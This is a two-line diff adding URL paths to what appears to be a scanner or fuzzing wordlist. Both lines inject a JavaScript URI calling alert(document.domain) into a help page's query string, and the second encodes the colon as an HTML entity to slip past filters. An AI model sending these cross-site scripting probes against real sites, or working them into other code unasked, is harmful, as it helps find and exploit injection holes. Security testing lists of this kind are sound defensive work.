@@ -1,0 +1,2 @@
+/help/english/index.html?javascript:alert(document.domain)
+/help/english/index.html?javascript&#58;alert(document.domain)
